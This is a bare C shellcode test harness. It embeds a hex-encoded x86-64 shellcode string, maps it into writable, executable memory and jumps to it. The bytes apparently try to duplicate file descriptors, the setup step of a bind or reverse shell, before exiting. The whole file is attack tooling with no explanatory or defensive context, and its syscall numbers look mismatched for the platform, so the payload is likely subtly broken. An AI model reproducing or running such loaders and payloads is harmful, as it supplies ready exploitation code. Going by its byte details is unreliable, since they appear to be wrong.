#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x31\xc0\xb0\x3f\x4c\x89\xd7\x0f\x05\x48\xc1\xee\x10\xb0\x3f\x4c\x89\xd7\x0f\x05\x48\xc1\xee\x10\xb0\x3f\x4c\x89\xd7\x0f\x05\x48\x31\xf6\x48\x29\xc0\x48\x31\xd2\xb0\x3c\x4c\x89\xd7\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
